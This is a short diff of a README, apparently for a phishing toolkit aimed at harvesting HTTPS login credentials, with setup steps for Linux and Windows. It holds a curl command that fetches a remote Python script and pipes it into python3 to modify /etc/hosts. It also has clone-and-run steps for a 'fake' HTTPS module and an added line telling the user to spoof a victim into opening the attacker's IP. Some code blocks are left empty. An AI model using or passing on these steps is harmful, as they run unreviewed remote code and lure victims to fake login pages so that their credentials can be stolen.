@@ -24,11 +24,18 @@ setoolkit
 ```bash
 curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-login-credentials/master/hosts/modules/pyexploitcreate/pyexploitcreateIP_host_fake.py | python3 >> /etc/hosts
 ```
-- For Windows
+- continue..
+-----------------------------------------------------------------------------------------
+# For Windows
+1. -
 ```
 git clone https://github.com/nu11secur1ty/SSTC-HTTPS-login-credentials.git 
 cd SSTC-HTTPS-login-credentials/sh1mazu_https_fake
 bash sh1m@zu.sh
+```
+2. -
+- Spoof victim to open your IP ;)
+```
 ```
 
 
